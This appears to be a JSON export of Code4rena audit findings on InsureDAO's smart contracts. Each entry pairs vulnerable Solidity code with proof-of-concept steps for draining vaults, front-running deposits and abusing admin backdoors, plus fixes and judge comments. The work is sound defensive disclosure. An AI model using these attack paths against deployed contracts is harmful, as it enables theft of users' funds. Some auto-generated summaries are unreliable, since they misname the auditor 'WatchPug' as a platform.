      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\n## Root Cause\n\nWrong arithmetic.\n\n---\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L700-L717\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n    uint256 _actualDeduction;\n    for (uint256 i = 0; i < indexList.length; i++) {\n        address _index = indexList[i];\n        uint256 _credit = indicies[_index].credit;\n        if (_credit > 0) {\n            uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n                _totalCredit;\n            uint256 _redeemAmount = _divCeil(\n                _deductionFromIndex,\n                _shareOfIndex\n            );\n            _actualDeduction += IIndexTemplate(_index).compensate(\n                _redeemAmount\n            );\n        }\n    }\n```\n\n\n### PoC\n\n- totalLiquidity = 200,000* 10**18;\n- totalCredit = 100,000 * 10**18;\n- debt = 10,000 * 10**18;\n\n- [Index Pool 1] Credit = 20,000 * 10**18;\n- [Index Pool 2] Credit = 30,000 * 10**18;\n\n```\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) /\n            totalLiquidity();\n// _deductionFromIndex = 10,000 * 10**6 * 10**18;\n\n```\n\n[Index Pool 1]:\n\n```\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 200000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 25,000 * 10**18;\n```\n\n[Index Pool 2]:\n\n```\nuint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) / _totalCredit;  \n//  _shareOfIndex = 300000\n\nuint256 _redeemAmount = _divCeil(\n    _deductionFromIndex,\n    _shareOfIndex\n);\n\n// _redeemAmount = 16666666666666666666667 (~ 16,666 * 10**18)\n```\n\nIn most cases, the transaction will revet on underflow at:\n```\nuint256 _shortage = _deductionFromIndex /\n            MAGIC_SCALE_1E6 -\n            _actualDeduction;\n```\n\nIn some cases, specific pools will be liable for unfair compensation:\n\nIf the CSD is empty, `Index Pool 1` only have `6,000 * 10**18` and `Index Pool 2` only have `4,000 * 10**18`, the `_actualDeduction` will be `10,000 * 10**18`, `_deductionFromPool` will be `0`.\n\n\n`Index Pool 1` should only pay `1,000 * 10**18`, but actually paid `6,000 * 10**18`, the LPs of `Index Pool 1` now suffer funds loss.\n\n### Recommendation\n\nChange to:\n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```",
      "summary": "\nA bug report has been filed for the WatchPug platform. The root cause of the bug is wrong arithmetic. The PoC (Proof of Concept) given in the report states that if the totalLiquidity is 200,000* 10**18, totalCredit is 100,000 * 10**18 and debt is 10,000 * 10**18, and [Index Pool 1] Credit is 20,000 * 10**18 and [Index Pool 2] Credit is 30,000 * 10**18, then _deductionFromIndex is 10,000 * 10**6 * 10**18, _shareOfIndex for [Index Pool 1] is 200000 and _redeemAmount for [Index Pool 1] is 25,000 * 10**18, and _shareOfIndex for [Index Pool 2] is 300000 and _redeemAmount for [Index Pool 2] is 16666666666666666666667 (~ 16,666 * 10**18). In most cases, the transaction will revet on underflow, and in some cases, specific pools will be liable for unfair compensation.\n\nThe recommendation given in the report is to change the code to the following: \n\n```solidity\nuint256 _deductionFromIndex = (_debt * _totalCredit * MAGIC_SCALE_1E6) / totalLiquidity();\nuint256 _actualDeduction;\nfor (uint256 i = 0; i < indexList.length; i++) {\n    address _index = indexList[i];\n    uint256 _credit = indicies[_index].credit;\n    if (_credit > 0) {\n        uint256 _shareOfIndex = (_credit * MAGIC_SCALE_1E6) /\n            _totalCredit;\n        uint256 _redeemAmount = _divCeil(\n            _deductionFromIndex * _shareOfIndex,\n            MAGIC_SCALE_1E6 * MAGIC_SCALE_1E6\n        );\n        _actualDeduction += IIndexTemplate(_index).compensate(\n            _redeemAmount\n        );\n    }\n}\n```\n\nIn summary, a bug report has been filed for the WatchPug platform due to wrong arithmetic. The PoC states that specific pools will be liable for unfair compensation in some cases. The recommendation given",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/283",
      "tags": [],
      "finders": [
        "WatchPug",
        "danb"
      ]
    },
    {
      "id": "1303",
      "title": "[H-10] A malicious/compromised Registry or Factory admin can drain all the funds from the Vault contracts",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58>\n\n```solidity\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L201-L206>\n\n```solidity\nfunction borrowValue(uint256 _amount, address _to) external onlyMarket override {\n    debts[msg.sender] += _amount;\n    totalDebt += _amount;\n\n    IERC20(token).safeTransfer(_to, _amount);\n}\n```\n\nThe current design/implementation allows a market address (registered on the `registry`) to call `Vault#borrowValue()` and transfer tokens to an arbitrary address.\n\n#### Proof of Concept\n\nSee the PoC section on \\[WP-H24].\n\n#### Recommendation\n\n1.  Consider adding constrains (eg. timelock) to `Registry#supportMarket()`.\n2.  Consdier adding constrains (upper bound for each pool, and index pool for example) to `Vault#borrowValue()`.\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/272):**\n > Ownership has to be stolen to drain funds using this method and we assume ownership control driven safely, so we don't treat this as issue\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/272#issuecomment-1023327233):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault contract. The vulnerability allows a market address, registered on the registry, to call Vault#borrowValue() and transfer tokens to an arbitrary address. This could be exploited to cause loss of funds. The PoC section of the report provides more details on how the vulnerability can be exploited. The report recommends two solutions to prevent this vulnerability from being exploited. The first is to add constraints to the Registry#supportMarket() function. The second is to add constraints, such as an upper bound for each pool and an index pool, to the Vault#borrowValue() function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/272",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1302",
      "title": "[H-09] Vault#setController() owner of the Vault contracts can drain funds from the Vault",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L485-L496\n\n```solidity\nfunction setController(address _controller) public override onlyOwner {\n    require(_controller != address(0), \"ERROR_ZERO_ADDRESS\");\n\n    if (address(controller) != address(0)) {\n        controller.migrate(address(_controller));\n        controller = IController(_controller);\n    } else {\n        controller = IController(_controller);\n    }\n\n    emit ControllerSet(_controller);\n}\n```\n\nThe owner of the Vault contract can set an arbitrary address as the `controller`.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352\n\n```solidity\nfunction utilize() external override returns (uint256 _amount) {\n    if (keeper != address(0)) {\n        require(msg.sender == keeper, \"ERROR_NOT_KEEPER\");\n    }\n    _amount = available(); //balance\n    if (_amount > 0) {\n        IERC20(token).safeTransfer(address(controller), _amount);\n        balance -= _amount;\n        controller.earn(address(token), _amount);\n    }\n}\n```\n\nA malicious `controller` contract can transfer funds from the Vault to the attacker.\n\n## PoC\n\nA malicious/compromised can:\n\n1. Call `Vault#setController()` and set `controller` to a malicious contract;\n    -   L489 the old controller will transfer funds to the new, malicious controller.\n2. Call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract.\n3. Withdraw all the funds from the malicious controller contract.\n\n## Recommendation\n\nConsider disallowing `Vault#setController()` to set a new address if a controller is existing, which terminates the possibility of migrating funds to a specified address provided by the owner. Or, putting a timelock to this function at least.",
      "summary": "\nThis bug report is about a vulnerability in the Vault contract of the 2022-01-insure repository. The owner of the Vault contract can set an arbitrary address as the `controller`. This malicious `controller` contract can then transfer funds from the Vault to the attacker. A malicious/compromised user can call the `Vault#setController()` and set `controller` to a malicious contract, and then call `Vault#utilize()` to deposit all the balance in the Vault contract into the malicious controller contract. The attacker can then withdraw all the funds from the malicious controller contract. To fix this vulnerability, it is recommended to consider disallowing the `Vault#setController()` to set a new address if a controller is existing, or to put a timelock to this function at least.",
      "quality_score": 5,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/271",
      "tags": [
        "Admin"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1301",
      "title": "[H-08] IndexTemplate.sol#compensate() will most certainly fail",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\n## Root Cause\n\nPrecision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.\n\n---\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447\n\n```solidity\nuint256 _shortage;\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = _value + _cds;\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\nIn the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.\n\nHowever, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.\n\nDue to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.\n\nAt L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.\n\nAt L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.\n\nAs a result, `resume()` can not be done, and the debt can't be repaid.\n\n### PoC \n\nGiven:\n\n- vault.underlyingValue = 10,000\n- vault.valueAll = 30,000\n- totalAttributions = 2,000,000\n- _amount = 1,010,000\n\n0. _shortage = _amount - vault.underlyingValue = 1,000,000\n1. _attributions = (_amount * totalAttributions) / valueAll = 67,333,333\n2. actualValueTransfered = (valueAll * _attributions) / totalAttributions = 1009999\n\n**Expected results**: actualValueTransfered = _shortage;\n\n**Actual results**: actualValueTransfered < _shortage.\n\n## Impact\n\nThe precision loss isn't just happening on special numbers, but will most certainly always revert the txs.\n\nThis will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.\n\n## Recommendation\n\nChange to:\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446\n\n```solidity\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = vault.underlyingValue(address(this));\n}\nvault.offsetDebt(_compensated, msg.sender);\n```",
      "summary": "\nThis bug report is about an issue with the Precision Loss while converting between the amount of shares and the amount of underlying tokens back and forth in the WatchPug contract. This issue can cause malfunction of the contract, leading to frozen funds of the LPs of the pool and the index pool, and other stakeholders of the same vault suffering fund loss from an unfair share of the funds compensated before.\n\nThe root cause of this issue is that while the CDSTemplate.sol#compensate() takes a parameter for the amount of underlying tokens, it uses vault.transferValue() to transfer corresponding _attributions (shares) instead of underlying tokens. This leads to precision loss, and the _attributions transferred in the terms of underlying tokens will most certainly be less than the shortage. At L444, the contract believes that it's been compensated for _value + _cds, which is lower than the actual value due to precision loss. When it calls vault.offsetDebt(_compensated, msg.sender) at L446, the transaction will revert at require(underlyingValue(msg.sender) >= _amount), and the debt can't be repaid.\n\nThe recommendation to fix this issue is to change the code to the given one, so that the vault.underlyingValue is used instead of the _attributions. This will ensure that the actual value transferred is equal to the shortage, and the transaction will not revert.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/269",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1300",
      "title": "[H-07] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users’ wallet balances",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThe current design/implementation allows a `market` address (registered on `registry`) to call `Vault#addValue()` and transfer tokens from an arbitrary address to a specified `_beneficiary` up the approved amount at any time, and the `_beneficiary` can withdraw the funds by calling `Vault#withdrawAllAttribution()` immediately.\n\nThis poses a very dangerous risk to all the users that approved their tokens to the Vault contracts (each one holds all users' allowances for that token).\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58\n\n```solidity=52\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140\n\n```solidity=124\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\nRegistry owner can call `Registry#supportMarket()` and mark an arbitrary address as a `market`.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L49-L60\n\n```solidity=49\nfunction supportMarket(address _market) external override {\n    require(!markets[_market], \"ERROR: ALREADY_REGISTERED\");\n    require(\n        msg.sender == factory || msg.sender == ownership.owner(),\n        \"ERROR: UNAUTHORIZED_CALLER\"\n    );\n    require(_market != address(0), \"ERROR: ZERO_ADDRESS\");\n\n    allMarkets.push(_market);\n    markets[_market] = true;\n    emit NewMarketRegistered(_market);\n}\n```\n\nOr, the owner of the Factory can call `createMarket()` to add a malicous market contract via a custom template contract to the `markets` list.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216\n\n## PoC\n\nA malicious/compromised Registry owner can:\n\n1. Call `Registry#supportMarket()` and set `markets[attackerAddress]` to `true`;\n2. Call `Vault#addValue(token.balanceOf(victimAddress), victimAddress, attackerAddress)` and transferring all the balanceOf victim's wallet to the vault, owned by `attackerAddress`.\n3. Call `Vault#withdrawAllAttribution(attackerAddress)` and retrive the funds.\n\nThe malicious/compromised Registry owner can repeat the steps above for all the users who approved the Vault contract for all the Vault contracts.\n\nAs a result, the attacker can steal all the wallet balances of the tokens approved to the protocol.\n\n## Root Cause\n\nImproper access control for using users' allowances.\n\n## Recommendation\n\nConsider changing the design/implementation to make sure that the allowances approved by the users can only be used by themselves.",
      "summary": "\nThis bug report is regarding a vulnerability found in the WatchPug application. The current design/implementation allows a market address to call Vault#addValue() and transfer tokens from an arbitrary address to a specified beneficiary up the approved amount at any time, and the beneficiary can withdraw the funds by calling Vault#withdrawAllAttribution() immediately. This poses a very dangerous risk to all the users that approved their tokens to the Vault contracts as a malicious/compromised Registry owner can call Registry#supportMarket() and mark an arbitrary address as a market or the owner of the Factory can call createMarket() to add a malicous market contract via a custom template contract to the markets list. As a result, the attacker can steal all the wallet balances of the tokens approved to the protocol. The root cause of this vulnerability is improper access control for using users' allowances. To fix this issue, it is recommended to change the design/implementation to make sure that the allowances approved by the users can only be used by themselves.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/266",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1299",
      "title": "[H-06] the first depositor to a pool can drain all users",
      "impact": "HIGH",
      "content": "_Submitted by danb_\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L807>\nif there is no liquidity in the pool, the first deposit determines the total liquidity, if the amount is too small the minted liquidity for the next liquidity providers will round down to zero.\n\n#### Impact\n\nAn attacker can steal all money from liquidity providers.\n\n#### Proof of Concept\n\nconsider the following scenario:\na pool is created.\nthe attacker is the first one to deposit, they deposit with \\_amount == 1, the smallest amount possible. meaning the total liquidity is 1.\nthen they join another pool in order to get attributions in the vault.\nthey transfer the attributions to the pool using `transferAttribution`.\nfor example, they transferred 1M dollar worth of attributions.\nthe next person deposits in the index, for example, 500,000 dollars.\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L803>\nthe amount they will get is:\n\n    _amount = (_value * _supply) / _originalLiquidity;\n\nas we know:\n\\_amount = 500,000 dollar\n\\_supply = 1\n\\_totalLiquidity = 1,000,000 dollar (the attacker transferred directly)\nthe investor will get (500,000 dollar \\* 1) / (1,000,000 dollar) = 0\nand they will pay 500,000\nthis money will go to the index, and the attacker holds all of the shares, so they can withdraw it and get 1,500,000 stealing 500,000 dollars from the second investor.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/263):**\n > yes. Every address that has attributions can call transferAttribution(), however, the address has to call addValue() to earn attributions. addValue() has onlyMarket modifier.\n> To pass onlyMarket modifier, ownership has to be stolen, in short.\n> Since we assume ownership control is driven safely, we don't take this as an issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/263#issuecomment-1023330012):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> \n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n",
      "summary": "\nA bug report has been filed regarding a vulnerability in the PoolTemplate.sol contract. If there is no liquidity in the pool, the first deposit determines the total liquidity, and if the amount is too small, the minted liquidity for the next liquidity providers will round down to zero. This vulnerability allows an attacker to steal all money from liquidity providers. \n\nA proof of concept was provided to illustrate the vulnerability. In the scenario, a pool is created and the attacker is the first one to deposit an amount of 1, the smallest amount possible. The attacker then joins another pool to get attributions in the vault, transferring 1M dollar worth of attributions to the pool. When the next person deposits 500,000 dollars, the amount they will get is 0, meaning they will pay 500,000 dollars but the money will go to the index, allowing the attacker to withdraw it and get 1,500,000, stealing 500,000 dollars from the second investor.\n\nThe vulnerability was discovered through manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/263",
      "tags": [],
      "finders": [
        "danb"
      ]
    },
    {
      "id": "1298",
      "title": "[H-05] backdoor in withdrawRedundant",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token) &&\n          balance < IERC20(token).balanceOf(address(this))\n     ) {\n          uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n               balance;\n          IERC20(token).safeTransfer(_to, _redundant);\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n#### POC\n- Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)`\n- Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.\n\n## Impact\nThere's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.\n\n## Recommended Mitigation Steps\nI think the devs wanted this logic from the code instead:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```",
      "summary": "\nA bug report has been submitted by user cmichel for the `Vault.withdrawRedundant` function in a smart contract. This function has a wrong logic that allows the admins to steal the underlying vault token. When the `Vault.addValue` is called, the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. If the admins call `vault.withdrawRedundant(vault.token(), attacker)`, it will transfer out all `vault.token()` amounts to the attacker due to the balance inequality condition being `false`. This creates a backdoor in the `withdrawRedundant` function that allows admins to steal all user deposits.\n\nThe recommended mitigation step is to change the code to the following:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\nThis will ensure that the admins cannot steal the underlying vault token and the user deposits will remain secure.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/252",
      "tags": [
        "Admin"
      ],
      "finders": [
        "WatchPug",
        "camden",
        "Ruhum",
        "cmichel"
      ]
    },
    {
      "id": "1297",
      "title": "[H-04] Initial pool deposit can be stolen",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by WatchPug_\n\nNote that the `PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) *from* the initial depositor (`_references[4]`):\n\n```solidity\n// PoolTemplate\nfunction initialize(\n     string calldata _metaData,\n     uint256[] calldata _conditions,\n     address[] calldata _references\n) external override {\n     // ...\n\n     if (_conditions[1] > 0) {\n          // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])\n          _depositFrom(_conditions[1], _references[4]);\n     }\n}\n\nfunction _depositFrom(uint256 _amount, address _from)\n     internal\n     returns (uint256 _mintAmount)\n{\n     require(\n          marketStatus == MarketStatus.Trading && paused == false,\n          \"ERROR: DEPOSIT_DISABLED\"\n     );\n     require(_amount > 0, \"ERROR: DEPOSIT_ZERO\");\n\n     _mintAmount = worth(_amount);\n     // @audit vault calls asset.transferFrom(_from, vault, _amount)\n     vault.addValue(_amount, _from, address(this));\n\n     emit Deposit(_from, _amount, _mintAmount);\n\n     //mint iToken\n     _mint(_from, _mintAmount);\n}\n```\n\nThe initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.\n\nAn attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market *with different parameters* but still passing in `_conditions[1]=amount` and `_references[4]=victim`.\n\nA market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.\n\n#### Recommended Mitigation Steps\n\nCan the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/250):**\n > https://github.com/code-423n4/2022-01-insure-findings/issues/224\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PoolTemplate.initialize function, which is called when creating a market with Factory.createMarket. This function calls a vault function to transfer an initial deposit amount from the initial depositor, but the initial depositor needs to first approve the vault contract for the transferFrom to succeed. An attacker can then frontrun the Factory.createMarket transaction with their own market creation and create a market with different parameters, but still passing in the same initial deposit amount and initial depositor. This means the initial depositor's tokens are essentially lost, as they can be used to create a market with parameters they did not want.\n\nTo mitigate this vulnerability, it is recommended that the initial depositor be set to Factory.createMarket's msg.sender, instead of being able to pick a whitelisted one as _references[4]. This would prevent the attacker from frontrunning the Factory.createMarket transaction and creating a market with different parameters.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/250",
      "tags": [
        "Front-Running",
        "Initialization"
      ],
      "finders": [
        "WatchPug",
        "cmichel"
      ]
    },
    {
      "id": "1296",
      "title": "[H-03] Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\nThe current method of market creation involves calling `Factory.createMarket()` with a list of approved `_conditions` and `_references` accounts. If a registered template address has `templates[address(_template)].isOpen == true`, then any user is able to call `createMarket()` using this template. If the template points to `PoolTemplate.sol`, then a malicious market creator can abuse `PoolTemplate.initialize()` as it makes a vault deposit from an account that they control. The vulnerable internal function, `_depositFrom()`, makes a vault deposit from the `_references[4]` address (arbitrarily set to an approved reference address upon market creation).\n\nHence, if approved `_references` accounts have set an unlimited approval amount for `Vault.sol` before deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.\n\nThis issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval to `Vault.sol` was set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231>\n```solidity\nfunction createMarket(\n    IUniversalMarket _template,\n    string memory _metaData,\n    uint256[] memory _conditions,\n    address[] memory _references\n) public override returns (address) {\n    //check eligibility\n    require(\n        templates[address(_template)].approval == true,\n        \"ERROR: UNAUTHORIZED_TEMPLATE\"\n    );\n    if (templates[address(_template)].isOpen == false) {\n        require(\n            ownership.owner() == msg.sender,\n            \"ERROR: UNAUTHORIZED_SENDER\"\n        );\n    }\n    if (_references.length > 0) {\n        for (uint256 i = 0; i < _references.length; i++) {\n            require(\n                reflist[address(_template)][i][_references[i]] == true ||\n                    reflist[address(_template)][i][address(0)] == true,\n                \"ERROR: UNAUTHORIZED_REFERENCE\"\n            );\n        }\n    }\n\n    if (_conditions.length > 0) {\n        for (uint256 i = 0; i < _conditions.length; i++) {\n            if (conditionlist[address(_template)][i] > 0) {\n                _conditions[i] = conditionlist[address(_template)][i];\n            }\n        }\n    }\n\n    if (\n        IRegistry(registry).confirmExistence(\n            address(_template),\n            _references[0]\n        ) == false\n    ) {\n        IRegistry(registry).setExistence(\n            address(_template),\n            _references[0]\n        );\n    } else {\n        if (templates[address(_template)].allowDuplicate == false) {\n            revert(\"ERROR: DUPLICATE_MARKET\");\n        }\n    }\n\n    //create market\n    IUniversalMarket market = 